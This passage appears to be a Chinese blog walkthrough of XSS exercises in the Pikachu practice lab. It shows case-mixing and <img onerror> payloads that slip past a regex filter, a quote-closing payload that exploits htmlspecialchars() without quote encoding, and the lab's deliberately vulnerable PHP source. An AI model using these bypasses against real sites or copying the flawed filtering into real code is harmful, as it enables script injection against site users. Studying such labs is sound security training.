<p>现在正常的手段已经不起效了，我们自然而然想到绕过过滤</p>
<p>尝试了几种常见手段，大小写绕过成功了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">SCriPt</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;打个胶先&#39;</span><span class="p">)&lt;/</span><span class="nt">ScRiPT</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022091-0.png"></p>
<p><img alt="img" src="./img/2022091-admin-cum.png"></p>
<p><strong>绕过成功</strong></p>
<p>来看看后端源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;xss_01.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里会使用正则对&lt;script进行替换为空,也就是过滤掉
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//正则表达式对大小写敏感
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$message</span><span class="o">=</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//  $message=str_ireplace(&#39;&lt;script&gt;&#39;,$_GET[&#39;message&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$message</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p&gt;别说这些&#39;</span><span class="si">{</span><span class="nv">$message</span><span class="si">}</span><span class="s2">&#39;的话,不要怕,就是干!&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>马后炮：因为这里只过滤<code>&lt;script&gt;</code>标签，那么我们其实也可以利用<code>&lt;img&gt;</code>标签进行绕过：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">0721</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert(&#39;打个胶先&#39;)&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022091-admin-cum.png"></p>
<p><strong>成功</strong></p>
<h3 id="htmlspecialchars">htmlspecialchars()</h3>
<p>php中的<code>htmlspecialchars()</code>函数可以把预定义的字符转换为HTML实体：</p>
<ul>
<li><code>&amp;</code>变为<code>&amp;amp</code></li>
<li><code>&quot;</code>变为<code>&amp;quot</code></li>
<li><code>'</code>变为<code>&amp;#039</code></li>
<li><code>&lt;</code>变为<code>&amp;lt</code></li>
<li><code>&gt;</code>变为<code>&amp;gt</code></li>
</ul>
<p>函数语法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">string</span><span class="p">,</span><span class="nx">flags</span><span class="p">,</span><span class="nx">character</span><span class="o">-</span><span class="nx">set</span><span class="p">,</span><span class="nx">double_encode</span><span class="p">)</span>
</span></span></code></pre></div><p>其中可选参数flags可以规定如何处理引号、无效编码和使用哪种文档类型</p>
<p>有三种可用的引号类型选择：</p>
<ul>
<li><code>ENT_COMPAT</code>：仅编码双引号（默认参数）</li>
<li><code>ENT_QUOTES</code>：编码双引号和单引号</li>
<li><code>ENT_NOQUOTES</code>：不编码任何引号</li>
</ul>
<p>更多细节可以参看<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">W3school</a></p>
<p>那么，如果由于开发人员的疏忽并未选择编码任何引号，我们就有机可乘了</p>
<p>先来看一个输入框，试探一波</p>
<p><img alt="img" src="./img/2022090-0-2.png"></p>
<p>似乎做到了透明传输？看看源码先：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;page-content&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;xssr_main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_title&#34;</span><span class="p">&gt;</span>人生之所有苦短,是因为你的xss学习的还不够好<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;get&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_in&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;message&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;xssr_submit&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;notice&#39;</span><span class="p">&gt;</span>你的输入已经被记录:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="err">&amp;</span><span class="na">quot</span><span class="err">;&amp;</span><span class="na">lt</span><span class="err">;&amp;</span><span class="na">gt</span><span class="err">;&amp;</span><span class="na">amp</span><span class="err">;</span><span class="na">0721</span><span class="err">&#39;</span><span class="p">&gt;</span>&#39;<span class="ni">&amp;quot;&amp;lt;&amp;gt;&amp;amp;</span>0721<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>原来是用了<code>htmlspecialchars()</code>函数对输入进行编码，但是忘记选择编码单引号了，只要对单引号构造闭合就可以完成攻击了</p>
<p>构造payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span><span class="s1">&#39; onclick=&#39;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;打个胶先&#34;</span><span class="p">)</span><span class="err">&#39;</span>
</span></span></code></pre></div><p><img alt="img" src="./img/2022081-succ.png"></p>
<p><strong>成功</strong></p>
<p>来看看后端代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;xss_02.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html1</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html2</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
